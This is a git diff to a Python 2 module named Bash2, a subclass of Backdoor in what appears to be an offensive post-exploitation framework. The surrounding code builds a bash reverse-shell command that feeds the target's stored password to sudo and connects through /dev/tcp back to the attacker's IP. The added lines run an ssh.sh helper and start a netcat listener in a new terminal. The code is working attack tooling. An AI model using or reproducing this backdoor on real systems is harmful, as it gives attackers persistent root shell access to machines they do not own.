@@ -1,4 +1,5 @@
 from backdoor import *
+import subprocess
 
 class Bash2(Backdoor):
     prompt = Fore.RED + "(bash) " + Fore.BLUE + ">> " + Fore.RESET
@@ -17,7 +18,16 @@ class Bash2(Backdoor):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; sh <&196 >&196 2>&196" % self.get_value("port")
     
     def do_exploit(self, args):
-        port = self.get_value("port")
+
+	port = self.get_value("port")
+	ssh = subprocess.Popen(["./ssh.sh"], stdout=subprocess.PIPE,shell=True)
+	(out, err) = ssh.communicate()
+	if str(out) == 'n':
+	    print "lol"
+	    os.system("gnome-terminal -e 'nc -v -n -l -p " + str(port) + "'")
+	else:
+	    print out
+
         target = self.core.curtarget
         raw_input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
         print(GOOD + "Initializing backdoor...")
